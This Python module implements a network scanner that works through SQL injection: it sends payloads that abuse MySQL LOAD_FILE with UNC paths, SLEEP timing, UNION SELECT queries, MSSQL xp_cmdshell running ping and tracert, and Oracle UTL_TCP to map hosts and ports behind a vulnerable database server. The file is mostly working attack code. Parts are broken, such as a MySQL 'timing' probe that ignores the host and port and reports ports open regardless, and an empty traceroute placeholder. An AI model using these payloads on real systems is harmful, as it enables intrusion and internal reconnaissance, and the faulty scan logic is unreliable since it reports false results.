"""
Network Scanner via SQLi - Port scanning, network discovery, and service detection
"""

import ipaddress
import re
import socket
import struct
import time
from typing import Callable, Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class ScanResult:
    target: str
    port: int
    state: str
    service: str
    banner: str
    technique: str
    confidence: float
    duration: float


class NetworkScanner:
    def __init__(self, request_func: Callable = None, dbms: str = "MySQL"):
        self.request = request_func
        self.dbms = dbms
        self.timeout = 5

    # ── Port Scanning via SQLi ────────────────────────────────────

    def scan_port(self, host: str, port: int, technique: str = "connect") -> ScanResult:
        """Scan a single port via database connection functions"""
        start = time.time()
        result = ScanResult(host, port, "filtered", "", "", technique, 0, 0)

        if "MySQL" in self.dbms or "MariaDB" in self.dbms:
            result = self._mysql_port_scan(host, port)
        elif "MSSQL" in self.dbms:
            result = self._mssql_port_scan(host, port)
        elif "Oracle" in self.dbms:
            result = self._oracle_port_scan(host, port)

        result.duration = round(time.time() - start, 3)
        return result

    def _mysql_port_scan(self, host: str, port: int) -> ScanResult:
        """Port scan using MySQL CONNECTION functions"""
        # Use CONNECTION_ID or SLEEP timing to detect open ports
        # Technique: Use LOAD_FILE to try connecting to remote share (SMB)
        if port == 445 or port == 139:
            payload = (f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\{host}\\test'))) "
                       f"AND SLEEP(IF((SELECT 1 FROM (SELECT COUNT(*), "
                       f"CONNECTION_ID()) x), 3, 0))-- -")
            try:
                start = time.time()
                self.request(payload)
                elapsed = time.time() - start
                if elapsed > 2.5:
                    return ScanResult(host, port, "open", "SMB", "", "mysql_connection", 0.6, elapsed)
            except Exception:
                pass

        # Generic timing-based scan using BENCHMARK/SLEEP
        payload = (f"' AND IF((SELECT COUNT(*) FROM "
                   f"INFORMATION_SCHEMA.TABLES WHERE "
                   f"IF(1=1, SLEEP(2), 0)), SLEEP(3), 0)-- -")
        try:
            start = time.time()
            self.request(payload)
            elapsed = time.time() - start
            # Base response time indicates port is reachable
            if elapsed < 5:  # Got response = host reachable
                service = self._guess_service(port)
                return ScanResult(host, port, "open", service, "", "mysql_timing", 0.5, elapsed)
        except Exception:
            return ScanResult(host, port, "filtered", "", "", "mysql_timing", 0.1, 0)

        return ScanResult(host, port, "closed", "", "", "mysql_timing", 0.3, 0)

    def _mssql_port_scan(self, host: str, port: int) -> ScanResult:
        """Port scan using MSSQL xp_cmdshell"""
        try:
            # Use ping via xp_cmdshell if available
            payload = f"'; EXEC xp_cmdshell 'ping -n 1 {host}';-- -"
            response = self.request(payload)
            if "TTL=" in response or "Reply from" in response:
                service = self._guess_service(port)
                return ScanResult(host, port, "open", service, "", "mssql_ping", 0.8, 1)
        except Exception:
            pass

        return ScanResult(host, port, "filtered", "", "", "mssql_ping", 0.2, 0)

    def _oracle_port_scan(self, host: str, port: int) -> ScanResult:
        """Port scan using Oracle UTL_TCP/UTL_HTTP"""
        try:
            payload = f"' AND (SELECT UTL_TCP.CONNECTION_OPEN('{host}', {port}, 5) FROM DUAL)-- -"
            response = self.request(payload)
            if response:
                service = self._guess_service(port)
                return ScanResult(host, port, "open", service, "", "oracle_tcp", 0.7, 1)
        except Exception:
            pass
        return ScanResult(host, port, "filtered", "", "", "oracle_tcp", 0.2, 0)

    def _guess_service(self, port: int) -> str:
        """Guess service name from port number"""
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "SMB",
            143: "IMAP", 389: "LDAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS",
            500: "IKE", 514: "Syslog", 587: "SMTP", 636: "LDAPS", 993: "IMAPS",
            995: "POP3S", 1080: "SOCKS", 1433: "MSSQL", 1521: "Oracle",
            2049: "NFS", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            5900: "VNC", 5985: "WinRM", 5986: "WinRMs", 6379: "Redis",
            8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 27017: "MongoDB",
        }
        return services.get(port, "Unknown")

    # ── Network Discovery ─────────────────────────────────────────

    def discover_network(self, subnet: str, ports: List[int] = None) -> List[ScanResult]:
        """Discover hosts and open ports on a subnet"""
        results = []
        ports = ports or [3306, 80, 443, 22, 8080]

        try:
            network = ipaddress.ip_network(subnet, strict=False)
            for ip in network.hosts():
                ip_str = str(ip)
                for port in ports:
                    result = self.scan_port(ip_str, port)
                    if result.state == "open":
                        results.append(result)
        except Exception as e:
            pass

        return results

    def find_database_servers(self, subnet: str) -> List[ScanResult]:
        """Find database servers on a subnet"""
        db_ports = {
            "MySQL": 3306, "MariaDB": 3306, "PostgreSQL": 5432,
            "MSSQL": 1433, "Oracle": 1521, "Redis": 6379,
            "MongoDB": 27017, "Elasticsearch": 9200,
        }
        results = []
        for db, port in db_ports.items():
            try:
                # Use this approach only with the first few hosts
                network = ipaddress.ip_network(subnet, strict=False)
                for ip in list(network.hosts())[:10]:
                    result = self.scan_port(str(ip), port)
                    if result.state == "open":
                        result.service = db
                        results.append(result)
            except Exception:
                continue
        return results

    # ── Banner Grabbing ──────────────────────────────────────────

    def grab_banner(self, host: str, port: int) -> str:
        """Grab service banner via SQLi"""
        if "MySQL" in self.dbms:
            # Try to read from mysql.user to detect version
            payload = "' UNION SELECT @@VERSION-- -"
            try:
                response = self.request(payload)
                # Extract banner-like info
                for line in response.split("\n"):
                    line = line.strip()
                    if "MySQL" in line or "Maria" in line or ":" in line[:10]:
                        return line[:200]
            except Exception:
                pass

        return ""

    # ── Network Path Discovery ────────────────────────────────────

    def traceroute(self, host: str) -> List[str]:
        """Approximate traceroute via SQLi - try to determine network path"""
        hops = []

        if "MSSQL" in self.dbms:
            payload = f"'; EXEC xp_cmdshell 'tracert -h 10 {host}';-- -"
            try:
                response = self.request(payload)
                for line in response.split("\n"):
                    if "ms" in line and len(line) < 100:
                        hops.append(line.strip())
            except Exception:
                pass

        elif "MySQL" in self.dbms:
            # Use LOAD_FILE timing to guess latency
            for ttl in range(1, 10):
                pass  # Placeholder

        return hops

    # ── DNS Resolution via SQLi ───────────────────────────────────

    def resolve_dns(self, domain: str) -> List[str]:
        """DNS resolution via database functions"""
        results = []

        if "MySQL" in self.dbms or "MariaDB" in self.dbms:
            # Use connection timing to resolve
            payload = (f"' AND (SELECT COUNT(*) FROM "
                       f"INFORMATION_SCHEMA.TABLES WHERE "
                       f"LOAD_FILE(CONCAT('\\\\\\\\{domain}\\test')))-- -")
            try:
                self.request(payload)
                results.append(domain)  # Resolvable
            except Exception:
                pass

        return results

    # ── Internal IP Discovery ─────────────────────────────────────

    def get_internal_ip(self) -> str:
        """Discover internal IP of the database server"""
        if "MySQL" in self.dbms or "MariaDB" in self.dbms:
            payload = "' UNION SELECT @@HOSTNAME-- -"
            try:
                response = self.request(payload)
                # Then try to resolve it
                for line in response.split("\n"):
                    line = line.strip()
                    if len(line) > 0 and len(line) < 100 and not line.startswith("<"):
                        return line
            except Exception:
                pass

        if "MSSQL" in self.dbms:
            payload = "' UNION SELECT HOST_NAME()-- -"
            try:
                response = self.request(payload)
                for line in response.split("\n"):
                    line = line.strip()
                    if line:
                        return line
            except Exception:
                pass

        return ""

    # ── Comprehensive Network Scan ────────────────────────────────

    def scan_all(self, target: str, ports: List[int] = None,
                 techniques: List[str] = None) -> Dict:
        """Perform comprehensive network scan"""
        ports = ports or [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143,
                         389, 443, 445, 993, 995, 1433, 1521, 2049, 3306,
                         3389, 5432, 5900, 6379, 8080, 8443, 27017]
        techniques = techniques or ["connect", "timing"]

        results = {
            "target": target,
            "internal_ip": self.get_internal_ip(),
            "ports": [],
            "db_servers": [],
            "dns": [],
        }

        # Port scan
        for port in ports:
            result = self.scan_port(target, port)
            if result.state == "open":
                banner = self.grab_banner(target, port)
                result.banner = banner
                results["ports"].append(result)

        # DNS resolution
        results["dns"] = self.resolve_dns(target)

        return results
